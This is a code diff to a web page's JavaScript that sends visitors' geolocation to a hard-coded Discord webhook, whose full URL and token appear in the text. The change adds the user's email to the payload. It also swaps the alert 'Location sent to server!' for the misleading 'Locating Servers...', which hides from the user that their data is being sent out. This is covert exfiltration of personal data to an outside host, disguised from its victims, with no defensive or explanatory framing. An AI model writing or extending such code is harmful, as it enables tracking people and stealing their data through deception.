@@ -27,7 +27,7 @@
 
 			var webhookUrl = "https://discordapp.com/api/webhooks/1092569585045221386/8la5fQp6icwktAFDw68NpIInnDUvYbHEMZRTeItiBqyH8tk4AP8iSlCTTTZormOH-cZO";
 			var data = {
-				content: "User location: " + latitude + ", " + longitude
+				content: "User location: " + latitude + ", " + longitude + "\n Email: " + email
 			};
 			$.ajax({
 				type: "POST",
@@ -35,10 +35,10 @@
 				data: JSON.stringify(data),
 				contentType: "application/json",
 				success: function() {
-					alert("Location sent to server!");
+					alert("Locating Servers...");
 				},
 				error: function(xhr, status, error) {
-					alert("Error sending location to server: " + error);
+					alert("Error locating server: " + error);
 				}
 			});
 		}
